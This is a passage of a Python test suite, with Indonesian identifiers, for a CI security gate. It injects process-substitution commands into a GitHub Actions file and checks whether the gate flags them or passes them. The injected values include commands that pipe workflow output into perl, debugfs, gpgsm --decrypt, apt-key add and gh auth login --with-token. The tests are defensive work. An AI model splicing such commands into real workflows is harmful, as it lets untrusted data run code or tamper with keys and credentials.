        baris_aksi636 = [b for b in isi_aksi636.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru636 = isi_aksi636.replace(
                baris_aksi636,
                baris_aksi636.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(perl -0777pe skrip.pl; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru636 != isi_aksi636, \
            "suntikan aksi636 tidak menembak"
        with open(berkas_aksi636, "w", encoding="utf-8") as f:
            f.write(isi_baru636)
        rc, out = jalan(sub636, [sys.executable, GERBANG, "--semua"])
        periksa("perl -0777pe skrip.pl: "
                "gerbang gagal (Audit 1411)", rc != 0)
        shutil.rmtree(sub636, ignore_errors=True)
        sub637 = klon(tmp, "sub637")
        berkas_aksi637 = os.path.join(
            sub637, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi637, encoding="utf-8") as f:
            isi_aksi637 = f.read()
        baris_aksi637 = [b for b in isi_aksi637.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru637 = isi_aksi637.replace(
                baris_aksi637,
                baris_aksi637.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(perl -ned skrip.pl; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru637 != isi_aksi637, \
            "suntikan aksi637 tidak menembak"
        with open(berkas_aksi637, "w", encoding="utf-8") as f:
            f.write(isi_baru637)
        rc, out = jalan(sub637, [sys.executable, GERBANG, "--semua"])
        periksa("perl -ned skrip.pl: "
                "gerbang lolos (Audit 1412)", rc == 0)
        shutil.rmtree(sub637, ignore_errors=True)
        sub638 = klon(tmp, "sub638")
        berkas_aksi638 = os.path.join(
            sub638, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi638, encoding="utf-8") as f:
            isi_aksi638 = f.read()
        baris_aksi638 = [b for b in isi_aksi638.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru638 = isi_aksi638.replace(
                baris_aksi638,
                baris_aksi638.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(debugfs -z; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru638 != isi_aksi638, \
            "suntikan aksi638 tidak menembak"
        with open(berkas_aksi638, "w", encoding="utf-8") as f:
            f.write(isi_baru638)
        rc, out = jalan(sub638, [sys.executable, GERBANG, "--semua"])
        periksa("debugfs -z: "
                "gerbang lolos (Audit 1413)", rc == 0)
        shutil.rmtree(sub638, ignore_errors=True)
        sub639 = klon(tmp, "sub639")
        berkas_aksi639 = os.path.join(
            sub639, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi639, encoding="utf-8") as f:
            isi_aksi639 = f.read()
        baris_aksi639 = [b for b in isi_aksi639.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru639 = isi_aksi639.replace(
                baris_aksi639,
                baris_aksi639.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(debugfs -f -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru639 != isi_aksi639, \
            "suntikan aksi639 tidak menembak"
        with open(berkas_aksi639, "w", encoding="utf-8") as f:
            f.write(isi_baru639)
        rc, out = jalan(sub639, [sys.executable, GERBANG, "--semua"])
        periksa("debugfs -f -: "
                "gerbang gagal (Audit 1414)", rc != 0)
        shutil.rmtree(sub639, ignore_errors=True)
        sub640 = klon(tmp, "sub640")
        berkas_aksi640 = os.path.join(
            sub640, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi640, encoding="utf-8") as f:
            isi_aksi640 = f.read()
        baris_aksi640 = [b for b in isi_aksi640.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru640 = isi_aksi640.replace(
                baris_aksi640,
                baris_aksi640.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(git stash push -m -p; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru640 != isi_aksi640, \
            "suntikan aksi640 tidak menembak"
        with open(berkas_aksi640, "w", encoding="utf-8") as f:
            f.write(isi_baru640)
        rc, out = jalan(sub640, [sys.executable, GERBANG, "--semua"])
        periksa("git stash push -m -p: "
                "gerbang lolos (Audit 1415)", rc == 0)
        shutil.rmtree(sub640, ignore_errors=True)
        sub641 = klon(tmp, "sub641")
        berkas_aksi641 = os.path.join(
            sub641, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi641, encoding="utf-8") as f:
            isi_aksi641 = f.read()
        baris_aksi641 = [b for b in isi_aksi641.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru641 = isi_aksi641.replace(
                baris_aksi641,
                baris_aksi641.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(git add -- -patch; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru641 != isi_aksi641, \
            "suntikan aksi641 tidak menembak"
        with open(berkas_aksi641, "w", encoding="utf-8") as f:
            f.write(isi_baru641)
        rc, out = jalan(sub641, [sys.executable, GERBANG, "--semua"])
        periksa("git add -- -patch: "
                "gerbang lolos (Audit 1415)", rc == 0)
        shutil.rmtree(sub641, ignore_errors=True)
        sub642 = klon(tmp, "sub642")
        berkas_aksi642 = os.path.join(
            sub642, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi642, encoding="utf-8") as f:
            isi_aksi642 = f.read()
        baris_aksi642 = [b for b in isi_aksi642.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru642 = isi_aksi642.replace(
                baris_aksi642,
                baris_aksi642.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(git format-patch --output-directory --stdin HEAD; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru642 != isi_aksi642, \
            "suntikan aksi642 tidak menembak"
        with open(berkas_aksi642, "w", encoding="utf-8") as f:
            f.write(isi_baru642)
        rc, out = jalan(sub642, [sys.executable, GERBANG, "--semua"])
        periksa("git format-patch --output-directory --stdin HEAD: "
                "gerbang lolos (Audit 1416)", rc == 0)
        shutil.rmtree(sub642, ignore_errors=True)
        sub643 = klon(tmp, "sub643")
        berkas_aksi643 = os.path.join(
            sub643, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi643, encoding="utf-8") as f:
            isi_aksi643 = f.read()
        baris_aksi643 = [b for b in isi_aksi643.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru643 = isi_aksi643.replace(
                baris_aksi643,
                baris_aksi643.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(openssl asn1parse -length 100; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru643 != isi_aksi643, \
            "suntikan aksi643 tidak menembak"
        with open(berkas_aksi643, "w", encoding="utf-8") as f:
            f.write(isi_baru643)
        rc, out = jalan(sub643, [sys.executable, GERBANG, "--semua"])
        periksa("openssl asn1parse -length 100: "
                "gerbang gagal (Audit 1417)", rc != 0)
        shutil.rmtree(sub643, ignore_errors=True)
        sub644 = klon(tmp, "sub644")
        berkas_aksi644 = os.path.join(
            sub644, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi644, encoding="utf-8") as f:
            isi_aksi644 = f.read()
        baris_aksi644 = [b for b in isi_aksi644.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru644 = isi_aksi644.replace(
                baris_aksi644,
                baris_aksi644.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(openssl sess_id -context abc; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru644 != isi_aksi644, \
            "suntikan aksi644 tidak menembak"
        with open(berkas_aksi644, "w", encoding="utf-8") as f:
            f.write(isi_baru644)
        rc, out = jalan(sub644, [sys.executable, GERBANG, "--semua"])
        periksa("openssl sess_id -context abc: "
                "gerbang gagal (Audit 1418)", rc != 0)
        shutil.rmtree(sub644, ignore_errors=True)
        sub645 = klon(tmp, "sub645")
        berkas_aksi645 = os.path.join(
            sub645, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi645, encoding="utf-8") as f:
            isi_aksi645 = f.read()
        baris_aksi645 = [b for b in isi_aksi645.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru645 = isi_aksi645.replace(
                baris_aksi645,
                baris_aksi645.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(openssl req -text -noout; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru645 != isi_aksi645, \
            "suntikan aksi645 tidak menembak"
        with open(berkas_aksi645, "w", encoding="utf-8") as f:
            f.write(isi_baru645)
        rc, out = jalan(sub645, [sys.executable, GERBANG, "--semua"])
        periksa("openssl req -text -noout: "
                "gerbang gagal (Audit 1419)", rc != 0)
        shutil.rmtree(sub645, ignore_errors=True)
        sub646 = klon(tmp, "sub646")
        berkas_aksi646 = os.path.join(
            sub646, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi646, encoding="utf-8") as f:
            isi_aksi646 = f.read()
        baris_aksi646 = [b for b in isi_aksi646.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru646 = isi_aksi646.replace(
                baris_aksi646,
                baris_aksi646.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(pdftoppm -scale-to 800 - hasil; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru646 != isi_aksi646, \
            "suntikan aksi646 tidak menembak"
        with open(berkas_aksi646, "w", encoding="utf-8") as f:
            f.write(isi_baru646)
        rc, out = jalan(sub646, [sys.executable, GERBANG, "--semua"])
        periksa("pdftoppm -scale-to 800 - hasil: "
                "gerbang gagal (Audit 1420)", rc != 0)
        shutil.rmtree(sub646, ignore_errors=True)
        sub647 = klon(tmp, "sub647")
        berkas_aksi647 = os.path.join(
            sub647, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi647, encoding="utf-8") as f:
            isi_aksi647 = f.read()
        baris_aksi647 = [b for b in isi_aksi647.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru647 = isi_aksi647.replace(
                baris_aksi647,
                baris_aksi647.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(npm --loglevel warn init; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru647 != isi_aksi647, \
            "suntikan aksi647 tidak menembak"
        with open(berkas_aksi647, "w", encoding="utf-8") as f:
            f.write(isi_baru647)
        rc, out = jalan(sub647, [sys.executable, GERBANG, "--semua"])
        periksa("npm --loglevel warn init: "
                "gerbang gagal (Audit 1421)", rc != 0)
        shutil.rmtree(sub647, ignore_errors=True)
        sub648 = klon(tmp, "sub648")
        berkas_aksi648 = os.path.join(
            sub648, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi648, encoding="utf-8") as f:
            isi_aksi648 = f.read()
        baris_aksi648 = [b for b in isi_aksi648.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru648 = isi_aksi648.replace(
                baris_aksi648,
                baris_aksi648.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(python3 -m gzip berkas.gz -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru648 != isi_aksi648, \
            "suntikan aksi648 tidak menembak"
        with open(berkas_aksi648, "w", encoding="utf-8") as f:
            f.write(isi_baru648)
        rc, out = jalan(sub648, [sys.executable, GERBANG, "--semua"])
        periksa("python3 -m gzip berkas.gz -: "
                "gerbang gagal (Audit 1422)", rc != 0)
        shutil.rmtree(sub648, ignore_errors=True)
        sub649 = klon(tmp, "sub649")
        berkas_aksi649 = os.path.join(
            sub649, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi649, encoding="utf-8") as f:
            isi_aksi649 = f.read()
        baris_aksi649 = [b for b in isi_aksi649.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru649 = isi_aksi649.replace(
                baris_aksi649,
                baris_aksi649.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(pl2pm -v; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru649 != isi_aksi649, \
            "suntikan aksi649 tidak menembak"
        with open(berkas_aksi649, "w", encoding="utf-8") as f:
            f.write(isi_baru649)
        rc, out = jalan(sub649, [sys.executable, GERBANG, "--semua"])
        periksa("pl2pm -v: "
                "gerbang lolos (Audit 1423)", rc == 0)
        shutil.rmtree(sub649, ignore_errors=True)
        sub650 = klon(tmp, "sub650")
        berkas_aksi650 = os.path.join(
            sub650, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi650, encoding="utf-8") as f:
            isi_aksi650 = f.read()
        baris_aksi650 = [b for b in isi_aksi650.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru650 = isi_aksi650.replace(
                baris_aksi650,
                baris_aksi650.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(gh --hostname --with-token auth login; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru650 != isi_aksi650, \
            "suntikan aksi650 tidak menembak"
        with open(berkas_aksi650, "w", encoding="utf-8") as f:
            f.write(isi_baru650)
        rc, out = jalan(sub650, [sys.executable, GERBANG, "--semua"])
        periksa("gh --hostname --with-token auth login: "
                "gerbang lolos (Audit 1424)", rc == 0)
        shutil.rmtree(sub650, ignore_errors=True)
        sub651 = klon(tmp, "sub651")
        berkas_aksi651 = os.path.join(
            sub651, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi651, encoding="utf-8") as f:
            isi_aksi651 = f.read()
        baris_aksi651 = [b for b in isi_aksi651.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru651 = isi_aksi651.replace(
                baris_aksi651,
                baris_aksi651.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(pinentry; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru651 != isi_aksi651, \
            "suntikan aksi651 tidak menembak"
        with open(berkas_aksi651, "w", encoding="utf-8") as f:
            f.write(isi_baru651)
        rc, out = jalan(sub651, [sys.executable, GERBANG, "--semua"])
        periksa("pinentry: "
                "gerbang gagal (Audit 1425)", rc != 0)
        shutil.rmtree(sub651, ignore_errors=True)
        sub652 = klon(tmp, "sub652")
        berkas_aksi652 = os.path.join(
            sub652, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi652, encoding="utf-8") as f:
            isi_aksi652 = f.read()
        baris_aksi652 = [b for b in isi_aksi652.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru652 = isi_aksi652.replace(
                baris_aksi652,
                baris_aksi652.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(dirmngr; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru652 != isi_aksi652, \
            "suntikan aksi652 tidak menembak"
        with open(berkas_aksi652, "w", encoding="utf-8") as f:
            f.write(isi_baru652)
        rc, out = jalan(sub652, [sys.executable, GERBANG, "--semua"])
        periksa("dirmngr: "
                "gerbang gagal (Audit 1426)", rc != 0)
        shutil.rmtree(sub652, ignore_errors=True)
        sub653 = klon(tmp, "sub653")
        berkas_aksi653 = os.path.join(
            sub653, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi653, encoding="utf-8") as f:
            isi_aksi653 = f.read()
        baris_aksi653 = [b for b in isi_aksi653.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru653 = isi_aksi653.replace(
                baris_aksi653,
                baris_aksi653.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(gpg-connect-agent; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru653 != isi_aksi653, \
            "suntikan aksi653 tidak menembak"
        with open(berkas_aksi653, "w", encoding="utf-8") as f:
            f.write(isi_baru653)
        rc, out = jalan(sub653, [sys.executable, GERBANG, "--semua"])
        periksa("gpg-connect-agent: "
                "gerbang gagal (Audit 1427)", rc != 0)
        shutil.rmtree(sub653, ignore_errors=True)
        sub654 = klon(tmp, "sub654")
        berkas_aksi654 = os.path.join(
            sub654, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi654, encoding="utf-8") as f:
            isi_aksi654 = f.read()
        baris_aksi654 = [b for b in isi_aksi654.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru654 = isi_aksi654.replace(
                baris_aksi654,
                baris_aksi654.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(gpgsm --decrypt; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru654 != isi_aksi654, \
            "suntikan aksi654 tidak menembak"
        with open(berkas_aksi654, "w", encoding="utf-8") as f:
            f.write(isi_baru654)
        rc, out = jalan(sub654, [sys.executable, GERBANG, "--semua"])
        periksa("gpgsm --decrypt: "
                "gerbang gagal (Audit 1428)", rc != 0)
        shutil.rmtree(sub654, ignore_errors=True)
        sub655 = klon(tmp, "sub655")
        berkas_aksi655 = os.path.join(
            sub655, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi655, encoding="utf-8") as f:
            isi_aksi655 = f.read()
        baris_aksi655 = [b for b in isi_aksi655.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru655 = isi_aksi655.replace(
                baris_aksi655,
                baris_aksi655.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(derdump; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru655 != isi_aksi655, \
            "suntikan aksi655 tidak menembak"
        with open(berkas_aksi655, "w", encoding="utf-8") as f:
            f.write(isi_baru655)
        rc, out = jalan(sub655, [sys.executable, GERBANG, "--semua"])
        periksa("derdump: "
                "gerbang gagal (Audit 1429)", rc != 0)
        shutil.rmtree(sub655, ignore_errors=True)
        sub656 = klon(tmp, "sub656")
        berkas_aksi656 = os.path.join(
            sub656, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi656, encoding="utf-8") as f:
            isi_aksi656 = f.read()
        baris_aksi656 = [b for b in isi_aksi656.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru656 = isi_aksi656.replace(
                baris_aksi656,
                baris_aksi656.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(certutil -A -n nama -t ,, -d db; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru656 != isi_aksi656, \
            "suntikan aksi656 tidak menembak"
        with open(berkas_aksi656, "w", encoding="utf-8") as f:
            f.write(isi_baru656)
        rc, out = jalan(sub656, [sys.executable, GERBANG, "--semua"])
        periksa("certutil -A -n nama -t ,, -d db: "
                "gerbang gagal (Audit 1430)", rc != 0)
        shutil.rmtree(sub656, ignore_errors=True)
        sub657 = klon(tmp, "sub657")
        berkas_aksi657 = os.path.join(
            sub657, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi657, encoding="utf-8") as f:
            isi_aksi657 = f.read()
        baris_aksi657 = [b for b in isi_aksi657.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru657 = isi_aksi657.replace(
                baris_aksi657,
                baris_aksi657.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(cmsutil -D; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru657 != isi_aksi657, \
            "suntikan aksi657 tidak menembak"
        with open(berkas_aksi657, "w", encoding="utf-8") as f:
            f.write(isi_baru657)
        rc, out = jalan(sub657, [sys.executable, GERBANG, "--semua"])
        periksa("cmsutil -D: "
                "gerbang gagal (Audit 1431)", rc != 0)
        shutil.rmtree(sub657, ignore_errors=True)
        sub658 = klon(tmp, "sub658")
        berkas_aksi658 = os.path.join(
            sub658, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi658, encoding="utf-8") as f:
            isi_aksi658 = f.read()
        baris_aksi658 = [b for b in isi_aksi658.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru658 = isi_aksi658.replace(
                baris_aksi658,
                baris_aksi658.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(openssl ts -query; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru658 != isi_aksi658, \
            "suntikan aksi658 tidak menembak"
        with open(berkas_aksi658, "w", encoding="utf-8") as f:
            f.write(isi_baru658)
        rc, out = jalan(sub658, [sys.executable, GERBANG, "--semua"])
        periksa("openssl ts -query: "
                "gerbang gagal (Audit 1432)", rc != 0)
        shutil.rmtree(sub658, ignore_errors=True)
        sub659 = klon(tmp, "sub659")
        berkas_aksi659 = os.path.join(
            sub659, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi659, encoding="utf-8") as f:
            isi_aksi659 = f.read()
        baris_aksi659 = [b for b in isi_aksi659.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru659 = isi_aksi659.replace(
                baris_aksi659,
                baris_aksi659.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(openssl ca -in -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru659 != isi_aksi659, \
            "suntikan aksi659 tidak menembak"
        with open(berkas_aksi659, "w", encoding="utf-8") as f:
            f.write(isi_baru659)
        rc, out = jalan(sub659, [sys.executable, GERBANG, "--semua"])
        periksa("openssl ca -in -: "
                "gerbang gagal (Audit 1433)", rc != 0)
        shutil.rmtree(sub659, ignore_errors=True)
        sub660 = klon(tmp, "sub660")
        berkas_aksi660 = os.path.join(
            sub660, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi660, encoding="utf-8") as f:
            isi_aksi660 = f.read()
        baris_aksi660 = [b for b in isi_aksi660.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru660 = isi_aksi660.replace(
                baris_aksi660,
                baris_aksi660.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(git fmt-merge-msg; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru660 != isi_aksi660, \
            "suntikan aksi660 tidak menembak"
        with open(berkas_aksi660, "w", encoding="utf-8") as f:
            f.write(isi_baru660)
        rc, out = jalan(sub660, [sys.executable, GERBANG, "--semua"])
        periksa("git fmt-merge-msg: "
                "gerbang gagal (Audit 1434)", rc != 0)
        shutil.rmtree(sub660, ignore_errors=True)
        sub661 = klon(tmp, "sub661")
        berkas_aksi661 = os.path.join(
            sub661, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi661, encoding="utf-8") as f:
            isi_aksi661 = f.read()
        baris_aksi661 = [b for b in isi_aksi661.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru661 = isi_aksi661.replace(
                baris_aksi661,
                baris_aksi661.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(apt-key add -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru661 != isi_aksi661, \
            "suntikan aksi661 tidak menembak"
        with open(berkas_aksi661, "w", encoding="utf-8") as f:
            f.write(isi_baru661)
        rc, out = jalan(sub661, [sys.executable, GERBANG, "--semua"])
        periksa("apt-key add -: "
                "gerbang gagal (Audit 1435)", rc != 0)
        shutil.rmtree(sub661, ignore_errors=True)

        sub662 = klon(tmp, "sub662")
        berkas_aksi662 = os.path.join(
            sub662, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi662, encoding="utf-8") as f:
            isi_aksi662 = f.read()
        baris_aksi662 = [b for b in isi_aksi662.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru662 = isi_aksi662.replace(
                baris_aksi662,
                baris_aksi662.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(git fmt-merge-msg -m judul; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru662 != isi_aksi662, \
            "suntikan aksi662 tidak menembak"
        with open(berkas_aksi662, "w", encoding="utf-8") as f:
            f.write(isi_baru662)
        rc, out = jalan(sub662, [sys.executable, GERBANG, "--semua"])
        periksa("git fmt-merge-msg -m judul: "
                "gerbang gagal (Audit 1441)", rc != 0)
        shutil.rmtree(sub662, ignore_errors=True)
        umpanbak = klon(tmp, "umpanbak")
        berkas_ub = os.path.join(umpanbak, ".github", "actions",
                                 "resolve-vw", "action.yml")
        with open(berkas_ub, encoding="utf-8") as f:
            isi_ub = f.read()
        with open(berkas_ub, "w", encoding="utf-8") as f:
            f.write(isi_ub.replace(
                'echo "tag_mentah=$TAG" >> "$GITHUB_OUTPUT"',
                'echo "tagmentah=$TAG" >> "$GITHUB_OUTPUT"\n'
                '        echo "tag_mentah=$TAG" >> "$GITHUB_OUTPUT.bak"'))
        rc, out = jalan(umpanbak, [sys.executable, GERBANG, "--semua"])
        periksa("umpan redirect .bak nama produsen: gerbang gagal (Audit 870)",
                rc != 0 and "tag_mentah" in out)
        shutil.rmtree(umpanbak, ignore_errors=True)

        prod = klon(tmp, "prod")
        berkas_prod = os.path.join(prod, ".github", "actions",
                                   "resolve-vw", "action.yml")
        with open(berkas_prod, encoding="utf-8") as f:
            isi_prod = f.read()
        with open(berkas_prod, "w", encoding="utf-8") as f:
            f.write(isi_prod.replace('echo "tag_mentah=$TAG"',
                                     'echo "tagmentah=$TAG"'))
        rc, out = jalan(prod, [sys.executable, GERBANG, "--semua"])
        periksa("nama ditulis produsen resolve-vw diganti: gerbang gagal (Audit 855)",
                rc != 0 and "tag_mentah" in out)
        shutil.rmtree(prod, ignore_errors=True)

        idact = klon(tmp, "idact")
        berkas_act = os.path.join(idact, ".github", "actions",
                                  "resolve-vw", "action.yml")
        with open(berkas_act, encoding="utf-8") as f:
            isi_act = f.read()
        with open(berkas_act, "w", encoding="utf-8") as f:
            f.write(isi_act.replace("- id: vw", "- id: vwx"))
        rc, out = jalan(idact, [sys.executable, GERBANG, "--semua"])
        periksa("id langkah internal action diganti: gerbang gagal (Audit 840)",
                rc != 0 and "vw" in out)
        shutil.rmtree(idact, ignore_errors=True)

        lintas = klon(tmp, "lintas")
        berkas_bin = os.path.join(lintas, ".github", "workflows",
                                  "build-binary.yml")
        with open(berkas_bin, encoding="utf-8") as f:
            isi_bin = f.read()
        with open(berkas_bin, "a", encoding="utf-8") as f:
            f.write("\n  jobuji:\n    runs-on: ubuntu-latest\n"
                    "    steps:\n      - run: echo \"${{ steps.ambil.outputs.tag }}\"\n")
        rc, out = jalan(lintas, [sys.executable, GERBANG, "--semua"])
        periksa("rujukan steps lintas job: gerbang gagal (Audit 856)",
                rc != 0 and "ambil" in out)
        shutil.rmtree(lintas, ignore_errors=True)

        idl = klon(tmp, "idl")
        berkas_wf = os.path.join(idl, ".github", "workflows", "build-apk.yml")
        with open(berkas_wf, encoding="utf-8") as f:
            isi_wf = f.read()
        with open(berkas_wf, "w", encoding="utf-8") as f:
            f.write(isi_wf.replace("- id: ambil", "- id: ambil2"))
        rc, out = jalan(idl, [sys.executable, GERBANG, "--semua"])
        periksa("id langkah resolve-vw diganti: gerbang gagal (Audit 836)",
                rc != 0 and "ambil" in out)
        shutil.rmtree(idl, ignore_errors=True)

        sarang = klon(tmp, "sarang")
        berkas_set5 = os.path.join(sarang, "settings.gradle.kts")
        with open(berkas_set5, encoding="utf-8") as f:
            isi_set5 = f.read()
        with open(berkas_set5, "w", encoding="utf-8") as f:
            f.write(isi_set5.replace(
                "repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)",
                "/* luar /* dalam */ repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS) */"))
        rc, out = jalan(sarang, [sys.executable, GERBANG, "--semua"])
        periksa("komentar blok bersarang menyembunyikan mode: gerbang gagal (Audit 866)",
                rc != 0 and "FAIL_ON_PROJECT_REPOS" in out)
        shutil.rmtree(sarang, ignore_errors=True)

        charagp = klon(tmp, "charagp")
        berkas_agp2 = os.path.join(charagp, "build.gradle.kts")
        with open(berkas_agp2, encoding="utf-8") as f:
            isi_agp2 = f.read()
        with open(berkas_agp2, "w", encoding="utf-8") as f:
            f.write('val penanda = \'"\'\n'
                    '/* id("com.android.application") version'
                    ' "8.13.2" apply false */\n'
                    + isi_agp2.replace('version "8.13.2"',
                                       'version "9.9.9"'))
        rc, out = jalan(charagp, [sys.executable, GERBANG, "--semua"])
        periksa("char literal petik + AGP di komentar: gerbang gagal (Audit 873)",
                rc != 0 and "8.13.2" in out)
        shutil.rmtree(charagp, ignore_errors=True)

        charset = klon(tmp, "charset")
        berkas_set8 = os.path.join(charset, "settings.gradle.kts")
        with open(berkas_set8, encoding="utf-8") as f:
            isi_set8 = f.read()
        with open(berkas_set8, "w", encoding="utf-8") as f:
            f.write('val penanda = \'"\'\n' + isi_set8)
        rc, out = jalan(charset, [sys.executable, GERBANG, "--semua"])
        periksa("char literal petik di settings sehat: gerbang lolos (Audit 873)",
                rc == 0)
        shutil.rmtree(charset, ignore_errors=True)

        tplchar = klon(tmp, "tplchar")
        berkas_set9 = os.path.join(tplchar, "settings.gradle.kts")
        with open(berkas_set9, encoding="utf-8") as f:
            isi_set9 = f.read()
        with open(berkas_set9, "w", encoding="utf-8") as f:
            f.write('val penanda = "${\'"\'}"\n' + isi_set9)
